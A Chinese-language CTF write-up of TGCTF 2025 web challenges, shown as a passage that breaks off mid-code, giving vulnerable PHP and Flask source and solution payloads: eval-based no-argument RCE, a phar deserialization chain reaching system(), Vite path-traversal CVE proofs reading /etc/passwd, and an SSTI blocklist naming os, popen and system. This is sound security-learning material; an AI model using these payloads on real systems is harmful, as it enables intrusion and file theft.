class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>括号没有被禁止经过测试，无参RCE即可</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?tgctf2025=<span class="hljs-keyword">system</span>(<span class="hljs-keyword">end</span>(<span class="hljs-keyword">current</span>(get_defined_vars())));&amp;a=cat /flag;<br></code></pre></td></tr></table></figure><h3 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）"></a>AAA偷渡阴平（复仇）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>​<br><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br>​<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);<br>&#125;<br>​<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>这里把上一题的无参RCE禁用了好多，但是sessid没有被禁用</p><p>payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">tgctf2025</span>=session_start();system(hex2bin(session_id()));<br></code></pre></td></tr></table></figure><p>看其他师傅题解得知这里还可以使用一个函数apache_request_headers</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">system</span>(<span class="hljs-title">hex2bin</span>(<span class="hljs-title">key</span>(<span class="hljs-title">apache_request_headers</span>())))</span><br></code></pre></td></tr></table></figure><p>然后删除其他请求头，只留下一个我们构造的恶意头，他的键存放执行命令</p><h3 id="什么文件上传？"><a href="#什么文件上传？" class="headerlink" title="什么文件上传？"></a><strong>什么文件上传？</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>)))));<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;done;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;doing-&gt;better;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br>    <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化题目，用file_exists触发phar反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">yesterday</span>(); <span class="hljs-comment">//触发today的call</span><br>   <span class="hljs-variable">$a</span>-&gt;study=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">today</span>();<span class="hljs-comment">//md5(md5($this-&gt;doing))触发future的__toString</span><br>   <span class="hljs-variable">$a</span>-&gt;study-&gt;doing=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">future</span>();<br>   <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar1.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>   <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>   <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>   <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>   <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>   <span class="hljs-comment">//签名自动计算</span><br>   <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>   <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br></code></pre></td></tr></table></figure><p>然后用phar:&#x2F;&#x2F;伪协议触发在传入wow值即可</p><p>这里后缀名测试出来是atg</p><p><img src="/./../img/TGCTF/Web/6.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?filename=phar:<span class="hljs-regexp">//</span>.<span class="hljs-regexp">/uploads/</span>phar1.atg<br></code></pre></td></tr></table></figure><p><img src="/./../img/TGCTF/Web/7.png"></p><h3 id="什么文件上传？（复仇）"><a href="#什么文件上传？（复仇）" class="headerlink" title="什么文件上传？（复仇）"></a>什么文件上传？<strong>（复仇）</strong></h3><p>和上一题一模一样直接phar反序列化，可能上一题考点不是这个，但是也能用phar</p><h3 id="前端GAME"><a href="#前端GAME" class="headerlink" title="前端GAME"></a><strong>前端GAME</strong></h3><p><img src="/./../img/TGCTF/Web/8.png"></p><p>前端代码发现flag位置，但是看了半天没发现哪里可以读取</p><p>注意到使用vite框架搭建的，直接搜vite框架CVE</p><p>CVE-2025-30328</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://localhost:5173/@fs/C://windows/win.ini?import&amp;raw??&quot;<br></code></pre></td></tr></table></figure><p>根据POC我们构建payload</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> <span class="hljs-string">&quot;http://node2.tgctf.woooo.tech:30810/<span class="hljs-variable">@fs</span>/tgflaggg?import&amp;raw??&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/./../img/TGCTF/Web/9.png"></p><h3 id="前端GAME-Plus"><a href="#前端GAME-Plus" class="headerlink" title="前端GAME Plus"></a><strong>前端GAME Plus</strong></h3><p>和上一题一样，这里用的是CVE-2025-31486</p><p>POC</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl <span class="hljs-string">&#x27;http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init&#x27;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl &#x27;node2.tgctf.woooo.tech:<span class="hljs-number">3097</span>4/tgflagggg?.svg?.wasm?init&#x27;<br></code></pre></td></tr></table></figure><p><img src="/./../img/TGCTF/Web/10.png"></p><p><img src="/./../img/TGCTF/Web/11.png"></p><h3 id="前端GAME-Ultra"><a href="#前端GAME-Ultra" class="headerlink" title="前端GAME Ultra"></a><strong>前端GAME Ultra</strong></h3><p>同理CVE-2025-32395</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173<br></code></pre></td></tr></table></figure><p>PAYLOAD</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl --request-target /@fs/app/<span class="hljs-comment">#/../../../../../tgflagggg http://node1.tgctf.woooo.tech:30794/</span><br></code></pre></td></tr></table></figure><p><img src="/./../img/TGCTF/Web/12.png"></p><h3 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a>直面天命</h3><p><img src="/./../img/TGCTF/Web/13.png"></p><p>根据提示访问&#x2F;hint</p><p><img src="/./../img/TGCTF/Web/14.png"></p><p>有一个四字路由，最后发现是aazz</p><p><img src="/./../img/TGCTF/Web/15.png"></p><p>提示该页面可以传参</p><p><img src="/./../img/TGCTF/Web/16.png"></p><p>响应包中有filename参数，尝试读取&#x2F;flag</p><p><img src="/./../img/TGCTF/Web/17.png"></p><h3 id="直面天命（复仇）"><a href="#直面天命（复仇）" class="headerlink" title="直面天命（复仇）"></a><strong>直面天命（复仇）</strong></h3><p>同样访问aazz路由，这次得到了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory<br><span class="hljs-keyword">from</span> a.b.c.d.secret <span class="hljs-keyword">import</span> secret_key<br><br>app = Flask(__name__)<br><br>black_list=[<span class="hljs-string">&#x27;lipsum&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;_.&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&#x27;application&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;arg&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> name.lower():<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_typable</span>(<span class="hljs-params">char</span>):<br>    <span class="hljs-comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span><br>    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace<br>    <span class="hljs-keyword">return</span> char <span class="hljs-keyword">in</span> typable_chars<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/jingu&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>():<br>    template1=<span class="hljs-string">&quot;&quot;</span><br>    template2=<span class="hljs-string">&quot;&quot;</span><br>    name = request.form.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">if</span> waf(name):<br>        template = <span class="hljs-string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        k=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">if</span> is_typable(i):<br>                <span class="hljs-keyword">continue</span><br>            k=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (secret_key[:<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> name <span class="hljs-keyword">and</span> secret_key[<span class="hljs-number">2</span>:]):<br>                template = <span class="hljs-string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧&#x27;</span><br>                <span class="hljs-keyword">return</span> render_template_string(template)<br>            template1 = <span class="hljs-string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”&quot;</span><br>            template= template.replace(<span class="hljs-string">&quot;天命&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;&quot;</span>).replace(<span class="hljs-string">&quot;难违&quot;</span>,<span class="hljs-string">&quot;&#125;&#125;&quot;</span>)<br>            template = template<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-keyword">in</span> template:<br>        template2 = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> template1+render_template_string(template)+render_template_string(template2)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        error_message = <span class="hljs-string">f&quot;500报错了，查询语句如下：<span class="hljs-subst">&#123;template&#125;</span>&quot;</span><br>        <span class="hljs-keyword">return</span> error_message, <span class="hljs-number">400</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hint&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hinter</span>():<br>    template=<span class="hljs-string">&quot;hint：&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/aazz&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finder</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        source_code = f.read()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;source_code&#125;</span>&quot;</span>, <span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, 